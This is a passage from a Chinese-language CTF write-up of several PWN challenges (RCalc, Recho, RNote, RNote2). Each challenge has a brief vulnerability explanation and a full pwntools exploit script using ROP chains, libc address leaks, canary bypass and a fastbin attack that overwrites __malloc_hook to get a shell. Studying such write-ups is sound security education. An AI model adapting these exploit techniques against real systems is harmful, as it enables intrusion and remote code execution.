    fake_chunk = heap_base + 0x290
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    NewAirport(p, 0x40, p64(fake_chunk) + 'n')
    payload = ''
    payload += 'A' * 0x10
    payload += p64(heap_base + 0xb0)
    payload += p64(heap_base + 0x10)
    payload += p64(libc_base + 0x3f460)
    payload += p64(libc_base + 0x3f460)
    NewAirport(p, 0x40, payload + 'n')
    SelectPlane(p, '/bin/shn')
    p.interactive()
**RCalc**
Category:PWN Score:350
栈溢出+手写canary保护，但是因为堆布局以及四则运算保存结果时没有边界限制，可以通过该漏洞修改canary来绕过栈保护，
因为输入用的scanf(%s)所以无法通过leak
.got.plt段来得到libc地址，但是__libc_start_main@got并不在.got.plt，且其地址没有会被截断的字符 可以用来leak
libc
    from pwn import *
    context.log_level = 'debug'
    p = remote('127.0.0.1', 2333)
    context.log_level = 'info'
    puts_plt = 0x400850
    read_got = 0x601FF0
    rdi_ret = 0x0000000000401123
    main_addr = 0x0000000000401036
    payload = ''
    payload += 'x00' * 0x110
    payload += p64(0x010101010101)
    payload += p64(rdi_ret)
    payload += p64(read_got)
    payload += p64(puts_plt)
    payload += p64(main_addr)
    p.recvuntil('Input your name pls: ')
    p.send(payload + 'n')
    for i in range(35):
        p.recvuntil('Your choice:')
        p.send('1n')
        p.recvuntil('input 2 integer: ')
        p.send('0n0n')
        p.recvuntil('Save the result? ')
        p.send('yes')
    p.recvuntil('Your choice:')
    p.send('5n')
    libc_start_main_addr = u64(p.recvn(6).ljust(8, 'x00'))
    log.info("__libc_start_main() addr: " + hex(libc_start_main_addr))
    offset_libc_start_main = 0x0000000000020740
    offset_system = 0x0000000000045390
    offset_binsh = 0x18c177
    libc_base = libc_start_main_addr - offset_libc_start_main
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_binsh
    payload = ''
    payload += 'x00' * 0x110
    payload += p64(0x010101010101)
    payload += p64(rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    payload += p64(main_addr)
    p.recvuntil('Input your name pls: ')
    p.send(payload + 'n')
    for i in range(35):
        p.recvuntil('Your choice:')
        p.send('1n')
        p.recvuntil('input 2 integer: ')
        p.send('0n0n')
        p.recvuntil('Save the result? ')
        p.send('yes')
    p.recvuntil('Your choice:')
    p.send('5n')
    p.send('cat flagn')
    p.interactive()
**Recho**
Category:PWN Score:370
明显的栈溢出，需要让read()返回0，则需要发送方关闭连接，这样导致ROP只能做一次且无法继续交互，程序中留了相关的gadget
可以用于修改GOT表中的函数入口为syscall以及"flag"字符串用于open()->read()->write()来读flag  
    from pwn import *
    context.log_level = 'debug'
    #p = process('./Recho')
    p = remote('45.32.253.54', 9527)
    elf = ELF('./Recho')
    '''
    0x00000000004006fc : pop rax ; ret
    0x00000000004008a3 : pop rdi ; ret
    0x00000000004006fe : pop rdx ; ret
    0x00000000004008a1 : pop rsi ; pop r15 ; ret
    0x000000000040070d : add byte ptr [rdi], al ; ret
    '''
    rax_ret = 0x4006fc
    rdi_ret = 0x4008a3
    rdx_ret = 0x4006fe
    rsi_r15_ret = 0x4008a1
    add_rdi_al_ret = 0x40070d
    flag = 0x601058
    alarm_got = elf.got['alarm']
    read_plt = elf.plt['read']
    write_plt = elf.plt['write']
    alarm_plt = elf.plt['alarm']
    payload = ''
    payload += 'A' * 0x38
    payload += p64(rax_ret)
    payload += p64(0x05)
    payload += p64(rdi_ret)
    payload += p64(alarm_got)
    payload += p64(add_rdi_al_ret)
    payload += p64(rax_ret)
    payload += p64(0x02)
    payload += p64(rdi_ret)
    payload += p64(flag)
    payload += p64(rsi_r15_ret)
    payload += p64(0x00) * 2
    payload += p64(rdx_ret)
    payload += p64(0x00)
    payload += p64(alarm_plt)
    payload += p64(rdi_ret)
    payload += p64(0x03)
    payload += p64(rsi_r15_ret)
    payload += p64(0x601090)
    payload += p64(0x00)
    payload += p64(rdx_ret)
    payload += p64(0x30)
    payload += p64(read_plt)
    payload += p64(rdi_ret)
    payload += p64(0x01)
    payload += p64(rsi_r15_ret)
    payload += p64(0x601090)
    payload += p64(0x00)
    payload += p64(rdx_ret)
    payload += p64(0x30)
    payload += p64(write_plt)
    #raw_input()
    p.recvuntil('Welcome to Recho server!n')
    p.send(str(0x200) + 'n')
    p.send(payload.ljust(0x200, 'x00'))
    p.recv()
    p.shutdown("send")
    p.interactive()
    RNote
    Category:PWN Score:454
**RNote**
Category:PWN Score:454
off-by-one漏洞，可以free堆上某个范围内的任意地址，可以用来做fastbin attack  
    from pwn import *
    context.log_level = 'info'
    def New(p, size, title, content):
        p.recvuntil('Your choice: ')
        p.send('1n')
        p.recvuntil('Please input the note size: ')
        p.send(str(size) + 'n')
        p.recvuntil('Please input the title: ')
        p.send(title)
        p.recvuntil('Please input the content: ')
        p.send(content)
    def Delete(p, idx):
        p.recvuntil('Your choice: ')
        p.send('2n')
        p.recvuntil('Which Note do you want to delete: ')
        p.send(str(idx) + 'n')
    def Show(p, idx):
        p.recvuntil('Your choice: ')
        p.send('3n')
        p.recvuntil('Which Note do you want to show: ')
        p.send(str(idx) + 'n')
    p = process('./RNote')
    New(p, 0x20, 'A' * 0x0f + 'n', '/bin/shx00n')
    New(p, 0x20, 'B' * 0x0f + 'n', 'b' * 0x20)
    New(p, 0x20, 'C' * 0x0f + 'n', 'c' * 0x20)
    Delete(p, 2)
    Delete(p, 1)
    New(p, 0x20, 'B' * 0x0f + 'n', 'n')
    Show(p, 1)
    p.recvuntil('note content: ')
    heap_base = u64(p.recvn(4).ljust(8, 'x00')) - 0x0a
    log.info("heap base: " + hex(heap_base))
    binsh_addr = heap_base + 0x10
    New(p, 0x80, 'C' * 0x0f + 'n', 'c' * 0x80)
    New(p, 0x30, 'D' * 0x10 + chr(0x80), 'd' * 0x30)
    Delete(p, 2)
    New(p, 0x80, 'C' * 0x0f + 'n', 'n')
    Show(p, 2)
    p.recvuntil('note content: ')
    libc_base = u64(p.recvn(6).ljust(8, 'x00')) - 0x398b0a
    log.info("libc base: " + hex(libc_base))
    malloc_hook = libc_base + 0x398af0
    payload = ''
    payload += p64(0x00)
    payload += p64(0x71)
    payload += 'e' * 0x60
    payload += p64(0x00)
    payload += p64(0x71)
    New(p, 0x100, 'E' * 0x0f + 'n', payload + 'n')
    Delete(p, 4)
    Delete(p, 3)
    New(p, 0x100, 'E' * 0x0f + 'n', p64(0x00) + p64(0x71) + p64(malloc_hook - 0x23))
    New(p, 0x60, 'F' * 0x0f + 'n', 'f' * 0x10 + 'n')
    New(p, 0x60, 'G' * 0x0f + 'n', 'g' * 0x13 + p64(libc_base + 0x3f33a) + 'n')
    p.interactive()
**RNote2**
Category:PWN Score:606
可以用realloc()拓展堆块，用stancat()来填拓展的内容，漏洞在于realloc()拓展出来的区域不会初始化，仍留有之前作为空闲chunk的头部信息，
这样strncat()就会从预想的位置再往后1~2个字节开始填充
    from pwn import *
    context.log_level = 'debug'
    def New(p, length, content):
        p.recvuntil('choice:')
        p.send('1n')
        p.recvuntil('length:')
        p.send(str(length) + 'n')
        p.recvuntil('content:')
        p.send(content)
    def Delete(p, idx):
        p.recvuntil('choice:')
        p.send('2n')
        p.recvuntil('delete?')
        p.send(str(idx) + 'n')
    def List(p):
        p.recvuntil('choice:')
        p.send('3n')
    def Edit(p, idx, content):
        p.recvuntil('choice:')
        p.send('4n')
        p.recvuntil('edit?')
        p.send(str(idx) + 'n')
        p.recvuntil('content:')
        p.send(content)
    def Expend(p, idx, length, content):
        p.recvuntil('choice:')
        p.send('5n')
        p.recvuntil('expand?')